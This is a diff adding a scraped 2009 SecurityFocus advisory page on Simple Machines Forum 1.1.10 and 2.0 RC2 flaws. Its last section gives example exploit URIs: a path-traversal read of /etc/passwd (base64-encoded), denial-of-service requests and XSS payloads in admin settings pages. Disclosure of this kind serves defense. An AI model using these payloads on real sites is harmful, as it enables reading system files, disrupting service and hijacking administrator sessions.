@@ -1,0 +1,100 @@
+#SpeeDr00t@Black Falcon<br>#bid37182<p><b><span style="font-size: 18pt;">Simple Machines Forum Multiple Security Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/37182/info">info</a><br><a href="http://www.securityfocus.com/bid/37182/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/37182/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/37182/solution">solution</a><br><a href="http://www.securityfocus.com/bid/37182/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				37182
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Dec 02 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Dec 02 2009 05:55PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				SimpleAudit team from elhacker.net
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Simple Machines Simple Machines Forum 1.1.10 <br/>
+					
+				
+					Simple Machines Simple Machines Forum  2.0 RC2<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Simple Machines Simple Machines Forum 1.1.11 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can use a browser to exploit these issues. To exploit the cross-site scripting and cross-site request-forgery vulnerabilities, the attacker must entice an unsuspecting victim into following a malicious URI.<br/><br/>The following example URIs are available:<br/><br/>Information disclosure:<br/>http://www.example.com/index.php?action=admin;area=logs;sa=errorlog;file=L2V0Yy9wYXNzd2Q==<br/><br/>Denial of service:<br/>GET /.xml.html;sa=news;limit=999;type=rss HTTP/1.1<br/><br/>Denial of service (cookie):<br/>Cookie: GLOBALS<br/><br/>Cross-site scripting:<br/>http://www.example.com/index.php?action=admin;area=languages;sa=add;token <br/>PoC: "&amp;gt;&amp;lt;xss&amp;gt;<br/><br/>http://www.example.com/index.php?action=admin;area=theme;sa=settings;th=2;token<br/>PoC: http://urlreal"&amp;gt;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;
+	
+		<ul>
+</ul>
+</div>
